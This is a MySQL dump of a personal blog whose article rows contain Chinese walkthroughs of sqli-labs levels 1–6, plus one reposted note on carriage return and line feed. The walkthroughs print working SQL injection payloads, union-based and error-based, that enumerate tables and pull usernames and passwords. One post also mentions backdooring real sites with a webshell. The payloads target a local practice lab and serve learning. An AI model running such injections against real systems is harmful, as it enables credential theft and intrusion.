-- --------------------------------------------------------
-- 主机:                           cdb-e85utbv0.cd.tencentcdb.com
-- 服务器版本:                        5.7.18-20170830-log - 20170531
-- 服务器OS:                        Linux
-- HeidiSQL 版本:                  10.2.0.5599
-- --------------------------------------------------------

/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET NAMES utf8 */;
/*!50503 SET NAMES utf8mb4 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;


-- Dumping database structure for blog
CREATE DATABASE IF NOT EXISTS `blog` /*!40100 DEFAULT CHARACTER SET utf8 */;
USE `blog`;

-- Dumping structure for table blog.c_article
CREATE TABLE IF NOT EXISTS `c_article` (
  `aid` int(10) NOT NULL AUTO_INCREMENT,
  `title` varchar(50) NOT NULL,
  `author` varchar(20) NOT NULL,
  `content` mediumtext NOT NULL,
  `keywords` varchar(50) NOT NULL,
  `is_top` tinyint(1) NOT NULL DEFAULT '0',
  `click` int(10) NOT NULL DEFAULT '0',
  `addtime` date NOT NULL,
  `cid` tinyint(2) NOT NULL,
  `big_cid` tinyint(2) NOT NULL,
  `sort` int(10) NOT NULL,
  `title_pic` varchar(255) NOT NULL,
  PRIMARY KEY (`aid`)
) ENGINE=InnoDB AUTO_INCREMENT=115 DEFAULT CHARSET=utf8;

-- Dumping data for table blog.c_article: ~24 rows (大约)
/*!40000 ALTER TABLE `c_article` DISABLE KEYS */;
INSERT INTO `c_article` (`aid`, `title`, `author`, `content`, `keywords`, `is_top`, `click`, `addtime`, `cid`, `big_cid`, `sort`, `title_pic`) VALUES
	(81, 'less-1', 'Aomaha', '<p style="text-indent: 2em;">大家都知道OWASP TOP 10的TOP 1就是注入吧？不多说，直接开干！</p><p style="text-indent: 2em;">靶子是sqli-lab，网上搜一下就有下载，服务器环境我用的是phpstudy（环境安装百度吧。。。）</p><p style="text-indent: 2em;">我的注入工具是hackbar（火狐插件，当然用burpsuit抓包改包也行）</p><p style="text-indent: 2em;"><span style="font-size: 18px; font-family: impact, chicago;">less 1：</span></p><p style="text-indent: 2em;"><span style="font-size: 18px; font-family: impact, chicago;"><span style="font-family: arial, helvetica, sans-serif; font-size: 16px;">首先进入搭建的网站咯，我的地址是</span><span style="font-family: arial, helvetica, sans-serif; font-size: 16px;">http://127.0.0.1/test1/Less-1/index.php，然后出现下面提示：<br/></span></span></p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539435603117353.jpg" title="1539435603117353.jpg" alt="1.jpg"/></p><p style="text-indent: 2em;">显然接受参数是id（或者叫ID，windows不区分大小写）</p><p style="text-indent: 2em;">1）随便给个数字试试：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=12<br/></p><p style="text-indent: 2em;">页面显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539435883904585.jpg" title="1539435883904585.jpg" alt="2.jpg"/></p><p style="text-indent: 2em;">有显示，参数接受正确。测试是否存在注入点：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=12&#39;<br/></p><p style="text-indent: 2em;">显示如下：<br/> &nbsp;</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539436107560270.bmp" title="1539436107560270.bmp" alt="3.bmp"/></p><p style="text-indent: 2em;">居然是有回显的报错=-=，显然这个地方把没有单引号过滤，并且参数把单引号带进了sql语句，显然会造成单引号不匹配的语法错误，于是报错。得出这个地方存在注入于是只需要构造闭合的单引号就可以了。</p><p style="text-indent: 2em;"><span style="font-size: 18px; font-family: impact, chicago;"><span style="font-family: arial, helvetica, sans-serif; font-size: 16px;">2）现在知道了注入点，也知道了注入类型（数字型），下一步就是猜字段数了（知道字段数才能构建正确的payload）。</span></span></p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=2&#39; order by 3%23 （%23是#的url编码，在mysql里表示注释符）<br/></p><p style="text-indent: 2em;">显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539436934380392.bmp" title="1539436934380392.bmp" alt="4.bmp"/></p><p style="text-indent: 2em;">这里为了方便，我改了less 1的源码，可以显示其运行的sql语句，也就图中的最后一行。</p><p style="text-indent: 2em;">显然查询的结果集中至少存在3个字段，现在增加一个让它order by 4，显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539437118205207.bmp" title="1539437118205207.bmp" alt="5.bmp"/></p><p style="text-indent: 2em;">显示不正常页面，说明字段数就是3。</p><p style="text-indent: 2em;">3）知道了字段数，就直接构造有用的payload咯，一般会想到看看目标数据户的用户是不是root，是哪个数据库，版本是啥。开干之前先看看页面可以显示的位置在哪：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=-1&#39;union select 1,2,3%23 <br/></p><p style="text-indent: 2em;">显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539437554908511.bmp" title="1539437554908511.bmp" alt="6.bmp"/></p><p style="text-indent: 2em;">显然，显示位是2,3。于是在2,3位置构造查询信息。</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=-1&#39;union select 1,2,concat_ws(&#39;----&#39;,database(),user(),version())%23 （concat_ws()函数就是一个连接函数，显示位太少了不足以显示很多信息，于是用这个函数将多个信息连接为一个显示位）</p><p style="text-indent: 2em;">显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539437865447379.bmp" title="1539437865447379.bmp" alt="7.bmp"/></p><p style="text-indent: 2em;">可知：当前数据库是security，是root级别的用户，数据库版本号是5.5.53。5.5.53版本的mysql有information_schema数据库，而且当前用户是root，完全可以查看，嘿嘿嘿嘿，接下来可以直接查看表名和列名，然后可以直接查询记录（用户和密码）嘿嘿嘿，要是真实的网站，找到后台，输入账号密码不就进去了嘛，然后想办法上传木马，留后门，get-webshell嘿嘿嘿</p><p style="text-indent: 2em;">4）爆表：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=-1&#39;union select 1,2,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1)%23 <br/></p><p style="text-indent: 2em;">用这条payload，只需要改limit的第一个数字就是了，然后一直爆吧，会看到一个users表，一般后台账户密码都是放在这种表里吧。</p><p style="text-indent: 2em;">显示如下：（这个emails第一个表，换limit可以查看其他表名）</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539438618792398.bmp" title="1539438618792398.bmp" alt="8.bmp"/></p><p style="text-indent: 2em;">4）爆字段：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=-1&#39;union select 1,2,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 0,1)%23 <br/></p><p style="text-indent: 2em;">这里也是只需要该limit的第一个数字（开始位置），就可以继续爆users表里其他字段了。</p><p style="text-indent: 2em;">显示如下：（这是users表里的第一个字段：id）</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539438874672786.bmp" title="1539438874672786.bmp" alt="9.bmp"/><br/></p><p style="text-indent: 2em;">如果继续爆的话，会知道users表里有username,password字段，那么我们就直接查询咯嘿嘿嘿</p><p style="text-indent: 2em;">5）爆数据：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-1/index.php?id=-1&#39;union select 1,2,concat_ws(char(32,58,32),id,username,password) from users limit 0,1%23 <br/></p><p style="text-indent: 2em;">任然是修改limit的开始位置继续爆破下一条数据。</p><p style="text-indent: 2em;">显示如下：（这就是users表的第一个账户了）</p><p style="text-indent: 2em;"><img src="/upload/image/20181013/1539439276186272.bmp" title="1539439276186272.bmp" alt="10.bmp"/><br/></p><p style="text-indent: 2em;">都知道账号密码了，就去找后台吧=-=嘿嘿嘿</p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><span style="font-size: 18px; font-family: 微软雅黑, Microsoft YaHei;"><span style="font-size: 18px; font-family: arial, helvetica, sans-serif;"></span><br/></span></p><p style="text-indent: 2em;"><br/></p>', '注入', 0, 22, '2018-10-13', 55, -2, 0, '/upload/image/20181013/aaa87e408da88867090c1c53ef64df37.jpg'),
	(82, 'less-2', 'Aomaha', '<p style="text-indent: 2em;">第二关开始：</p><p style="text-indent: 2em;">提示id是接受参数，那么就随便给个id值咯</p><p style="text-indent: 2em;">1）观察是否存在注入点：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-2/index.php?id=1%27<br/></p><p style="text-indent: 2em;">显示：</p><p style="text-indent: 2em;"><img src="/upload/image/20181015/1539610964878344.bmp" title="1539610964878344.bmp" alt="1.bmp"/></p><p style="text-indent: 2em;">有回显的提示语法错误，显然是注入点,那么我们直接试试 and 1=1（payload:http://127.0.0.1/test1/Less-2/index.php?id=1 and 1=1 ），显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181015/1539611360905513.bmp" title="1539611360905513.bmp" alt="2.bmp"/></p><p style="text-indent: 2em;">显然是数字型注入点，那么我们的操作手法就和less1完全一模一样了，不讲了。<br/></p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><br/></p>', '注入', 0, 5, '2018-10-15', 55, -2, 0, '/upload/image/20181015/18496aaf05ffbbe5c31771108deec676.jpg'),
	(83, 'less-3', 'Aomaha', '<p style="text-indent: 2em;">首先简单的测试一下单引号：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-3/index.php?id=1%27<br/></p><p style="text-indent: 2em;">显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181016/1539663394142392.bmp" title="1539663394142392.bmp" alt="1.bmp"/></p><p style="text-indent: 2em;">（我直接把sql语句打印出来了，方便看）<br/></p><p style="text-indent: 2em;">显然有单引号闭合的错误，那么想办法构造正确的闭合：</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-3/index.php?id=1%27)%23</p><p style="text-indent: 2em;">显示如下：</p><p style="text-indent: 2em;"><img src="/upload/image/20181016/1539663716572970.bmp" title="1539663716572970.bmp" alt="2.bmp"/></p><p style="text-indent: 2em;">成功闭合，那么接下来的操作就和前面的一样了，不说了。<br/></p><p style="text-indent: 2em;"><br/> </p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;"><br/></p>', '注入', 0, 5, '2018-10-16', 55, -2, 0, '/upload/image/20181016/a5cad1e91b71e81849d8785c0fd9255c.jpg'),
	(84, 'less-4', 'Aomaha', '<p style="text-indent: 2em;">第四关：</p><p style="text-indent: 2em;">直接开干吧，太简单了</p><p style="text-indent: 2em;">payload：http://127.0.0.1/test1/Less-4/index.php?id=-1%22)%20union%20select%201,2,concat_ws(%27-----%27,user(),database(),version())%23<br/></p><p style="text-indent: 2em;">显示：</p><p style="text-indent: 2em;"><img src="/upload/image/20181016/1539685264110546.bmp" title="1539685264110546.bmp" alt="1.bmp"/></p><p style="text-indent: 2em;">暴表，爆字段，爆记录啥的和less1一样，不讲了。<br/> </p>', '注入', 0, 4, '2018-10-16', 55, -2, 0, '/upload/image/20181016/6392538df3019a7c3571984b48ab90c8.jpg'),
	(85, '回车与换行的区别', 'Aomaha', '<p style="text-indent: 2em;">转载自：<a href="https://www.pythontab.com/html/2017/linuxkaiyuan_0115/1116.html">https://www.pythontab.com/html/2017/linuxkaiyuan_0115/1116.html</a> </p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;关于换行和回车其实平时我们不太在意，所以关于两者的区别也不太清楚，在平时开发时可能会遇到一些文件处理的问题，放到不同的操作系统上出现各种坑。那么回车和换行到底有哪些区别呢？今天咱们就来总结一下。</p><h3 style="margin: 16px 0px; padding: 0px 0px 0px 10px; word-wrap: break-word; font-size: 20px; border-left: 6px solid rgb(8, 139, 230); color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">1. 由来</h3><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">在计算机还没有出现之前，有一种叫做电传打字机（Teletype Model 33）的机械打字机，每秒钟可以打10个字符。但是它有一个问题，就是打完一行换行的时候，要用去0.2秒，正好可以打两个字符。要是在这0.2秒里面，又有新的字符传过来，那么这个字符将丢失。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">于是，研制人员想了个办法解决这个问题，就是在每行后面加两个表示结束的字符。一个叫做“回车”，告诉打字机把打印头定位在左边界，不卷动滚筒；另一个叫做“换行”，告诉打字机把滚筒卷一格，不改变水平位置。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">这就是“换行”和“回车”的由来。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);"><br/></p><h3 style="margin: 16px 0px; padding: 0px 0px 0px 10px; word-wrap: break-word; font-size: 20px; border-left: 6px solid rgb(8, 139, 230); color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">2. 使用</h3><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">后来，计算机发明了，这两个概念也就被般到了计算机上。那时，存储器很贵，一些科学家认为在每行结尾加两个字符太浪费了，加一个就可以。于是，就出现了分歧。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">回车 \\r 本义是光标重新回到本行开头，r的英文return，控制字符可以写成CR，即Carriage Return</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">换行 \\n 本义是光标往下一行（不一定到下一行行首），n的英文newline，控制字符可以写成LF，即Line Feed</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">符号 &nbsp; &nbsp;ASCII码 &nbsp; &nbsp; &nbsp;意义</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">\\n &nbsp; &nbsp; &nbsp; &nbsp;10 &nbsp; &nbsp; &nbsp; &nbsp;换行NL</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">\\r &nbsp; &nbsp; &nbsp; &nbsp;13 &nbsp; &nbsp; &nbsp; &nbsp;回车CR</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">在不同的操作系统这几个字符表现不同，比如在WIN系统下，这两个字符就是表现的本义，在UNIX类系统，换行\\n就表现为光标下一行并回到行首，在MAC上，\\r就表现为回到本行开头并往下一行，至于ENTER键的定义是与操作系统有关的。通常用的Enter是两个加起来。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);"><br/></p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">不同操作系统下的含义：</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">\\n: &nbsp;UNIX 系统行末结束符</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">\\n\\r: window 系统行末结束符</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">\\r: &nbsp;MAC OS 系统行末结束符</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);"><br/></p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">我们经常遇到的一个问题就是，Unix/Mac系统下的文件在Windows里打开的话，所有文字会变成一行；而Windows里的文件在Unix/Mac下打开的话，在每行的结尾可能会多出一个^M符号。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);"><br/></p><h3 style="margin: 16px 0px; padding: 0px 0px 0px 10px; word-wrap: break-word; font-size: 20px; border-left: 6px solid rgb(8, 139, 230); color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">3. 软回车和硬回车</h3><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">再扩展一下回车的一些知识。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">硬回车就是普通我们按回车产生的，它在换行的同时也起着段落分隔的作用。&nbsp;</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">软回车是用 Shift + Enter 产生的，它换行，但是并不换段，即前后两段文字在 Word 中属于同一“段”。在应用格式时你会体会到这一点。</p><p style="margin-top: 0px; margin-bottom: 0px; padding: 3px 0px; word-wrap: break-word; line-height: 26px; text-align: justify; color: rgb(51, 51, 51); font-family: -apple-system, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Microsoft YaHei&quot;, &quot;Source Han Sans SC&quot;, &quot;Noto Sans CJK SC&quot;, &quot;WenQuanYi Micro Hei&quot;, sans-serif; white-space: normal; background-color: rgb(255, 255, 255);">软回车能使前后两行的行间距大幅度缩小，因为它不是段落标记，要和法定的段落标记——硬回车区别出来。硬回车的html代码是&lt;p&gt;..&lt;/p&gt;，段落的内容就夹在里面，而软回车的代码很精悍：&lt;br&gt;。网页的文字如果复制到word中，则硬回车变为弯曲的箭头，软回车变为向下的箭头。</p><p style="text-indent: 2em;"><br/></p>', '小知识', 0, 6, '2018-10-20', 56, -3, 0, '/upload/image/20181020/925ddc15d143ea97efae062b7f0d9942.jpg'),
	(87, 'less-5', 'Aomaha', '<p>&nbsp;&nbsp;&nbsp;&nbsp; &nbsp; 第五关是双注入。</p><p style="text-indent: 2em;">这关没有相关查询结果显示位置，但是发现有报错信息，所以利用双注入爆出需要的内容。</p><p style="text-indent: 2em;">关于双注入，详细的介绍转：<a href="http://www.2cto.com/article/201303/192718.html">http://www.2cto.com/article/201303/192718.html</a><br/></p><p style="text-indent: 2em;">但是这个只告诉你怎么用，至于原理，我只能说就是count()时候会多次执行select语句，但是由于floor(rand()*2)会导致多次执行的select的结果不同，所以会导致count()参照记录混乱所以出错，而且提示混乱的参照记录，也就是我们需要的信息。</p><p style="text-indent: 2em;">双注入的4要素：</p><p style="text-indent: 2em;">①count()</p><p style="text-indent: 2em;">②floor(rand()*2)</p><p style="text-indent: 2em;">③concat_ws()或者其他的连接函数</p><p style="text-indent: 2em;">④group by</p><p style="text-indent: 2em;"><br/></p><p style="text-indent: 2em;">这关的payload：</p><p style="text-indent: 2em;">一，爆数据库等信息：http://127.0.0.1/test1/Less-5/index.php?id=1&#39; union select count(*),999,concat_ws(&#39;===&#39;,database(),user(),version(),floor(rand()*2)) as a from information_schema.tables group by a--+</p><p style="text-indent: 2em;">二，爆表名信息：http://127.0.0.1/test1/Less-5/index.php?id=1&#39; union select count(*),999,concat_ws(&#39;===&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+</p><p style="text-indent: 2em;">三，爆列名信息：http://127.0.0.1/test1/Less-5/index.php?id=1&#39; union select count(*),999,concat_ws(&#39;===&#39;,(select column_name from information_schema.columns where table_name=&#39;users&#39; limit 1,1),floor(rand()*2)) as a from information_schema.tables group by a--+</p><p style="text-indent: 2em;">四，爆记录信息：http://127.0.0.1/test1/Less-5/index.php?id=1&#39; union select count(*),999,concat_ws(&#39;===&#39;,(select concat_ws(&#39;---&#39;,username,password) from users limit 0,1),floor(rand()*2)) as a from information_schema.tables group by a--+</p>', 'sql', 0, 7, '2018-11-03', 55, -2, 0, '/upload/image/20181103/da7d660216f533b847e5ecd33998cf1e.jpg'),
	(88, 'less-6', 'Aomaha', '<p style="text-indent: 2em;">这关也是双注入。。。。</p><p style="text-indent: 2em;">就是把上关的单引号换成双引号就可以了，payload一样的，换下单引号就是，就不说了。<br/></p>', 'sql', 0, 6, '2018-11-03', 55, -2, 0, '/upload/image/20181103/4455eb52bf95d713214907fe211d5d7d.jpg'),
